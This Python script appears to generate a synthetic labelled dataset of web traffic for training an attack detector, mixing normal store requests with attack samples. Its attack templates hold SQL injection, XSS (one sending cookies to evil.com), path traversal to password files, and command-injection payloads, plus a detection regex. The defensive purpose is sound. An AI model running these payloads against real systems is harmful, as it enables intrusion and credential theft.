import os
import re
import csv
import math
import random
from collections import Counter
from datetime import datetime, timedelta
import pandas as pd
import numpy as np

DATA_DIR = os.path.join(os.path.dirname(__file__), "data")
MASTER_CSV_PATH = os.path.join(DATA_DIR, "webguard_unified_master_dataset.csv")

SQL_REGEX = re.compile(
    r"(?i)\b(select|union|insert|update|delete|drop|exec|declare|cast|information_schema|table_name|column_name|script|alert|onload|onerror|eval|passwd|win\.ini|boot\.ini|cmd|whoami|cat\s+/)\b|--|\/\*|\*\/|\'\s*or\s*\'?|\bor\s+\d+=\d+|\band\s+\d+=\d+|\'--|1=1"
)
SPECIAL_CHARS = set(r"'\"<>;()/\-={}$`|&!#*+[]%")

def calculate_entropy(text):
    if not text:
        return 0.0
    length = len(text)
    counts = Counter(text)
    entropy = -sum((count / length) * math.log2(count / length) for count in counts.values())
    return round(entropy, 4)

def generate_unified_dataset(total_records=5000):
    print(f"Generating WebGuard Unified Master Dataset ({total_records} records)...")
    random.seed(42)
    np.random.seed(42)

    # 1. Establish Time Series Horizon (e.g. 14 days = 336 hours)
    start_time = datetime(2026, 11, 1, 0, 0, 0)
    
    # Generate realistic hourly traffic baseline curve
    hours_in_horizon = 336
    hourly_traffic_curve = {}
    
    base_volume = 2800.0
    daily_amplitude = 1200.0
    weekend_factor = 0.70
    
    for h in range(hours_in_horizon):
        dt = start_time + timedelta(hours=h)
        hod = dt.hour
        dow = dt.weekday()
        is_wknd = 1 if dow >= 5 else 0
        
        # Diurnal sinusoidal pattern (peaks around 14:00, troughs around 04:00)
        diurnal = math.sin((hod - 8) / 24.0 * 2 * math.pi)
        vol = (base_volume + (daily_amplitude * diurnal)) * (weekend_factor if is_wknd else 1.0)
        vol += np.random.normal(0, 150)
        hourly_traffic_curve[dt] = max(400.0, vol)

    # Precalculate lags & rolling stats for each hour
    hourly_stats = {}
    hours_sorted = sorted(hourly_traffic_curve.keys())
    for idx, dt in enumerate(hours_sorted):
        curr_vol = hourly_traffic_curve[dt]
        lag_1 = hourly_traffic_curve[hours_sorted[idx - 1]] if idx >= 1 else curr_vol
        lag_24 = hourly_traffic_curve[hours_sorted[idx - 24]] if idx >= 24 else curr_vol
        lag_168 = hourly_traffic_curve[hours_sorted[idx - 168]] if idx >= 168 else curr_vol
        
        past_6 = [hourly_traffic_curve[hours_sorted[i]] for i in range(max(0, idx - 6), idx)] if idx > 0 else [curr_vol]
        rolling_mean_6h = float(np.mean(past_6))
        rolling_std_6h = float(np.std(past_6)) if len(past_6) > 1 else 100.0
        
        # Traffic Surge Index (TSI): clip((curr_vol - 2986.23) / (3 * 1748.54), 0, 1)
        tsi = float(np.clip((curr_vol - 2986.23) / (3.0 * 1748.54), 0.0, 1.0))
        
        hourly_stats[dt] = {
            "hourly_traffic": round(curr_vol, 1),
            "lag_1": round(lag_1, 1),
            "lag_24": round(lag_24, 1),
            "lag_168": round(lag_168, 1),
            "rolling_mean_6h": round(rolling_mean_6h, 1),
            "rolling_std_6h": round(rolling_std_6h, 1),
            "tsi": round(tsi, 4)
        }

    # 2. Endpoints Catalog
    normal_endpoints = [
        ("GET", "/products/view?category=electronics&page=1"),
        ("GET", "/products/item?id=1049"),
        ("GET", "/cart/items"),
        ("POST", "/cart/add"),
        ("POST", "/checkout/order"),
        ("GET", "/user/profile"),
        ("POST", "/auth/login"),
        ("GET", "/search?q=wireless+headphones"),
        ("GET", "/reviews/list?product_id=88"),
        ("GET", "/static/images/banner.webp"),
        ("GET", "/categories/summer-sale"),
        ("GET", "/help/shipping-policy")
    ]

    attack_templates = [
        # SQLi
        ("GET", "/products/item?id=1049' OR 1=1--", "SQL Injection", "T1190"),
        ("GET", "/search?q=' UNION SELECT null,username,password FROM admin_users--", "SQL Injection", "T1190"),
        ("POST", "/auth/login", "admin'--", "SQL Injection", "T1190"),
        ("GET", "/products?cat=shoes'; DROP TABLE audit_log;--", "SQL Injection", "T1190"),
        # XSS
        ("GET", "/search?q=<script>alert('XSS')</script>", "Cross-Site Scripting", "T1059.007"),
        ("POST", "/reviews/add", "review_text=<img src=x onerror=fetch('http://evil.com/leak?c='+document.cookie)>", "Cross-Site Scripting", "T1059.007"),
        ("GET", "/user/profile?name=<svg/onload=alert(1)>", "Cross-Site Scripting", "T1059.007"),
        # Path Traversal
        ("GET", "/download?file=../../../../etc/passwd", "Directory Path Traversal", "T1083"),
        ("GET", "/view?template=..\\..\\windows\\win.ini", "Directory Path Traversal", "T1083"),
        ("GET", "/static?doc=../../../../etc/shadow", "Directory Path Traversal", "T1083"),
        # OS Command Injection
        ("POST", "/admin/diagnostics", "ip=127.0.0.1; cat /etc/passwd", "OS Command Injection", "T1059"),
        ("GET", "/system/ping?host=localhost|whoami", "OS Command Injection", "T1059"),
        ("POST", "/tools/exec", "target=google.com && id", "OS Command Injection", "T1059")
    ]

    # 3. Client Pool
    # Normal client profiles
    normal_clients = []
    for i in range(150):
        ip = f"{random.randint(11, 210)}.{random.randint(10, 240)}.{random.randint(1, 250)}.{random.randint(1, 250)}"
        normal_clients.append({
            "client_ip": ip,
            "rpm_base": random.uniform(1.0, 15.0),
            "err_base": random.uniform(0.0, 0.03),
            "uniq_base": random.randint(3, 14),
            "is_anomaly": 0
        })

    # Bot / Scanner / Anomaly client profiles (15 profiles)
    anomaly_clients = []
    for i in range(15):
        ip = f"198.51.100.{10 + i}"
        anomaly_type = random.choice(["flood", "fuzzer", "scraper"])
        if anomaly_type == "flood":
            rpm = random.uniform(500.0, 3500.0)
            err = random.uniform(0.04, 0.12)
            uniq = random.randint(1, 3)
        elif anomaly_type == "fuzzer":
            rpm = random.uniform(250.0, 800.0)
            err = random.uniform(0.70, 0.95)
            uniq = random.randint(80, 200)
        else: # scraper
            rpm = random.uniform(120.0, 300.0)
            err = random.uniform(0.10, 0.25)
            uniq = random.randint(60, 150)

        anomaly_clients.append({
            "client_ip": ip,
            "rpm_base": rpm,
            "err_base": err,
            "uniq_base": uniq,
            "is_anomaly": 1
        })

    records = []

    # 4. Generate records across hours
    for i in range(total_records):
        # Pick random timestamp
        random_hour_dt = random.choice(hours_sorted)
        t_stats = hourly_stats[random_hour_dt]
        
        # Exact second in that hour
        record_dt = random_hour_dt + timedelta(seconds=random.randint(0, 3599))
        
        # Decide if malicious (12% attack rate) or anomaly (5% client anomaly)
        is_attack_event = (random.random() < 0.12)
        is_client_anomaly = (random.random() < 0.05) if not is_attack_event else (random.random() < 0.35)

        # Pick client
        if is_client_anomaly:
            client = random.choice(anomaly_clients)
        else:
            client = random.choice(normal_clients)

        client_ip = client["client_ip"]
        rpm = round(client["rpm_base"] + np.random.normal(0, 1.5), 2)
        rpm = max(0.5, rpm)
        error_rate = round(min(1.0, max(0.0, client["err_base"] + np.random.normal(0, 0.02))), 3)
        unique_urls = max(1, int(client["uniq_base"] + np.random.randint(-1, 2)))

        if is_attack_event:
            atk_item = random.choice(attack_templates)
            if len(atk_item) == 4:
                method, url_path, attack_type, mitre = atk_item
                body_payload = ""
            else:
                method, url_path, body_payload, attack_type, mitre = atk_item

            is_attack = 1
            status_code = random.choice([200, 400, 403, 500])
        else:
            method, url_path = random.choice(normal_endpoints)
            body_payload = "qty=1&item_id=1049" if method == "POST" else ""
            attack_type = "Normal / Safe"
            mitre = "None"
            is_attack = 0
            status_code = 200 if random.random() > error_rate else random.choice([404, 500])

        # Construct raw request string
        if body_payload:
            request_str = f"{method} {url_path} HTTP/1.1\nHost: store.webguard.local\nUser-Agent: Mozilla/5.0\nX-Forwarded-For: {client_ip}\nContent-Length: {len(body_payload)}\n\n{body_payload}"
            combined_payload = url_path + " " + body_payload
        else:
            request_str = f"{method} {url_path} HTTP/1.1\nHost: store.webguard.local\nUser-Agent: Mozilla/5.0\nX-Forwarded-For: {client_ip}"
            combined_payload = url_path

        # Feature Extraction
        payload_len = len(combined_payload)
        entropy = calculate_entropy(combined_payload)
        param_count = combined_payload.count("=") + combined_payload.count("&")
        special_char_count = sum(1 for c in combined_payload if c in SPECIAL_CHARS)
        has_sql = 1 if SQL_REGEX.search(combined_payload) else 0

        # Estimated probabilities & scores
        attack_prob = round(random.uniform(0.92, 0.99), 4) if is_attack else round(random.uniform(0.01, 0.08), 4)
        behavior_score = round(random.uniform(0.65, 0.88), 4) if client["is_anomaly"] else round(random.uniform(0.32, 0.45), 4)
        tsi = t_stats["tsi"]
        
        # Composite risk
        risk_score = round((0.40 * attack_prob) + (0.30 * behavior_score) + (0.30 * tsi), 4)
        if attack_prob >= 0.90:
            risk_score = max(risk_score, 0.68)
        is_threat = 1 if risk_score >= 0.65 else 0

        records.append({
            # Temporal & Traffic Forecaster Features
            "timestamp": record_dt.strftime("%Y-%m-%d %H:%M:%S"),
            "hour_of_day": record_dt.hour,
            "day_of_week": record_dt.weekday(),
            "is_weekend": 1 if record_dt.weekday() >= 5 else 0,
            "hourly_traffic_volume": t_stats["hourly_traffic"],
            "traffic_lag_1": t_stats["lag_1"],
            "traffic_lag_24": t_stats["lag_24"],
            "traffic_lag_168": t_stats["lag_168"],
            "traffic_rolling_mean_6h": t_stats["rolling_mean_6h"],
            "traffic_rolling_std_6h": t_stats["rolling_std_6h"],
            "traffic_surge_index": tsi,
            
            # Client Session & Behavioral Anomaly Features
            "client_ip": client_ip,
            "requests_per_min": rpm,
            "error_rate": error_rate,
            "unique_urls": unique_urls,
            "is_client_anomaly": client["is_anomaly"],
            "client_behavior_score": behavior_score,

            # HTTP Request & Attack Classifier Features
            "method": method,
            "url_path": url_path,
            "status_code": status_code,
            "payload_length": payload_len,
            "payload_entropy": entropy,
            "param_count": param_count,
            "special_char_count": special_char_count,
            "has_sql_keyword": has_sql,
            "request_string": request_str,
            "is_attack": is_attack,
            "attack_type": attack_type,
            "attack_probability": attack_prob,

            # Composite Risk Fusion & Incident Response
            "composite_risk_score": risk_score,
            "is_threat": is_threat,
            "mitre_technique": mitre
        })

    df = pd.DataFrame(records)
    df.to_csv(MASTER_CSV_PATH, index=False)
    print(f"Successfully generated common unified master dataset ({len(df)} rows, {len(df.columns)} columns) at: {MASTER_CSV_PATH}")
    return df

if __name__ == "__main__":
    generate_unified_dataset(5000)
